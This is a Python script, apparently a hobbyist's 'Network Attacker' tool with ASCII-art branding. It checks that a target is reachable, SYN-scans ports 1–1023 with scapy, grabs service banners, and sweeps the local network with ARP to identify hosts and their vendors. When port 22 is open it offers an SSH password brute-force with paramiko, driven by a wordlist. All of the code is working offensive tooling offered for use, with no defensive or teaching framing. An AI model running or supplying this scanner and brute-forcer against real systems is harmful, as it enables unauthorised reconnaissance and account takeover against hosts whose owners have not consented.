import paramiko
from scapy.all import *
from scapy.layers.inet import TCP, IP, ICMP
from scapy.layers.l2 import ARP
from scapy.all import RandShort, conf, sr1, send
import socket
from scapy.layers.l2 import arping
from manuf import manuf
print('''
⣿⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⣛⣛⣛⣛⣛⣛⣛⣛⡛⠛⠛⠛⠛⠛⠛⠛⠛⠛⣿
⣿⠀⠀⠀⠀⢀⣠⣤⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣦⣤⣀⠀⠀⠀⠀⣿
⣿⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣤⡀⠀⣿
⣿⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣤⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⠀⠈⢻⣿⠿⠛⠛⠛⠛⠛⢿⣿⣿⣿⣿⣿⣿⡿⠟⠛⠛⠛⠛⠻⣿⣿⠋⠀⣿
⣿⠛⠁⢸⣥⣴⣾⣿⣷⣦⡀⠀⠈⠛⣿⣿⠛⠋⠀⢀⣠⣾⣿⣷⣦⣤⡿⠈⢉⣿
⣿⢋⣩⣼⡿⣿⣿⣿⡿⠿⢿⣷⣤⣤⣿⣿⣦⣤⣴⣿⠿⠿⣿⣿⣿⢿⣷⣬⣉⣿
⣿⣿⣿⣿⣷⣿⡟⠁⠀⠀⠀⠈⢿⣿⣿⣿⢿⣿⠋⠀⠀⠀⠈⢻⣿⣧⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣥⣶⣶⣶⣤⣴⣿⡿⣼⣿⡿⣿⣇⣤⣴⣶⣶⣾⣿⣿⣿⣿⣿⣿
⣿⣿⣿⡿⢛⣿⣿⣿⣿⣿⣿⡿⣯⣾⣿⣿⣿⣮⣿⣿⣿⣿⣿⣿⣿⡟⠿⣿⣿⣿
⣿⣿⡏⠀⠸⣿⣿⣿⣿⣿⠿⠓⠛⢿⣿⣿⡿⠛⠛⠻⢿⣿⣿⣿⣿⡇⠀⠹⣿⣿
⣿⣿⡁⠀⠀⠈⠙⠛⠉⠀⠀⠀⠀⠀⠉⠉⠀⠀⠀⠀⠀⠈⠙⠛⠉⠀⠀⠀⣿⣿
⣿⠛⢇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡸⠛⣿
⣿⠀⠈⢳⣶⣤⣤⣤⣤⡄⠀⠀⠠⠤⠤⠤⠤⠤⠀⠀⢀⣤⣤⣤⣤⣴⣾⠃⠀⣿
⣿⠀⠀⠈⣿⣿⣿⣿⣿⣿⣦⣀⡀⠀⠀⠀⠀⠀⣀⣤⣾⣿⣿⣿⣿⣿⠇⠀⠀⣿
⣿⠀⠀⠀⢹⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶⣶⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⣿
⣿⠀⠀⠀⠈⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀⠀⠀⣿
⣿⠀⠀⠀⠀⠀⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠁⠀⠀⠀⠀⣿
⣿⠀⠀⠀⠀⠀⠀⠈⠙⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠁⠀⠀⠀⠀⠀⠀⣿
⠛⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⠛⠛⠛⠉⠉⠛⠛⠛⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠛
⠀⠀⠀⣶⡶⠆⣴⡿⡖⣠⣾⣷⣆⢠⣶⣿⣆⣶⢲⣶⠶⢰⣶⣿⢻⣷⣴⡖⠀⠀
⠀⠀⢠⣿⣷⠂⠻⣷⡄⣿⠁⢸⣿⣿⡏⠀⢹⣿⢸⣿⡆⠀⣿⠇⠀⣿⡟⠀⠀⠀
⠀⠀⢸⣿⠀⠰⣷⡿⠃⠻⣿⡿⠃⠹⣿⡿⣸⡏⣾⣷⡆⢠⣿⠀⠀⣿⠃⠀⠀⠀
''')
print("Hello friend")
print("Welcome the the Network Attacker")
def grab_banner(ip, port):
    try:
        s = socket.socket()
        s.settimeout(5)
        s.connect((ip, port))
        s.send(b'Hello\r\n')
        banner = s.recv(1024).decode('utf-8').strip().replace('\r', '').replace('\n', '')
        s.close()
        return banner
    except Exception as e:
        print(f"Unable to grab banner for {ip}:{port}")
        return None

def BruteForce(port, password_list, username, target):
    SSHconn = paramiko.SSHClient()
    SSHconn.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    print(f"Attempting brute force on port {port} with username {username}...")
    with open(password_list, 'r') as file:
        passwords = [line.strip() for line in file.readlines()]

    for password in passwords:
        try:
            SSHconn.connect(target, port=int(port), username=username, password=password, timeout=1)
            print(f"Success! The password for {username} is {password}")
            SSHconn.close()
            break
        except paramiko.AuthenticationException:
            print(f"Trying password {password}... Failed.")
        except Exception as e:
            print(f"The password {password} failed.")
            print(f"An error occurred: {e}")
            break

user = input("Enter the SSH server's login username: ")
target = input("Enter the target IP address: ")
Registered_Ports = range(1, 1024)
open_ports = []


def scanport(port, target):
    try:
        conf.verb = 0
        source_port = RandShort()
        SynPkt = sr1(IP(dst=target)/TCP(sport=source_port, dport=port, flags="S"), timeout=0.5)
        if SynPkt is None or not SynPkt.haslayer(TCP):
            return False
        if SynPkt[TCP].flags == 0x12:
            send(IP(dst=target)/TCP(sport=source_port, dport=port, flags="R"))
            return True
        else:
            return False
    except Exception as e:
        print(f"Error scanning port {port}: {e}")
        return False

def check_target_availability(target):
    try:
        conf.verb = 0
        response = sr1(IP(dst=target)/ICMP(), timeout=2)
        return not (response is None)
    except Exception as e:
        print(f"Error checking target availability: {e}")
        return False

def send_icmp(target):
    try:
        conf.verb = 0
        icmp_response = sr1(IP(dst=target)/ICMP(), timeout=3)
        return not (icmp_response is None)
    except Exception as e:
        print(f"Error sending ICMP to target {target}: {e}")
        return None

if check_target_availability(target):
    print(f"The target {target} is available.")
    for port in Registered_Ports:
        status = scanport(port, target)
        if status:
            print(f"Port {port} is open.")
            banner = grab_banner(target, port)
            if banner:
                print(f"Banner for port {port}: {banner}")
            open_ports.append(port)
    print("Scan finished.")
    if 22 in open_ports:
        response = input("Port 22 is open. Do you want to perform a brute-force attack? (Y/N): ")
        if response.lower() in ['y', 'yes']:
            BruteForce(22, 'PasswordList.txt', user, target)
    response = input("Do you want to perform an ARP scan to discover active hosts and their vendors? (Y/N): ")
    if response.lower() in ['y', 'yes']:
        network = input("Enter the network range (e.g., 192.168.1.0/24): ")
        print(f"Scanning for active hosts in the network {network}...")
        ans, unans = arping(network, timeout=2, verbose=False)
        for snd, rcv in ans:
            mac_address = rcv.hwsrc
            try:
                p = manuf.MacParser()
                vendor = p.get_manuf(mac_address)
                print(f"Host {rcv.psrc} with MAC {mac_address} is active - Vendor: {vendor}")
            except ImportError:
                print(f"Host {rcv.psrc} with MAC {mac_address} is active")
    print(f"Open ports: {open_ports}")
else:
    print(f"The target {target} is not available.")

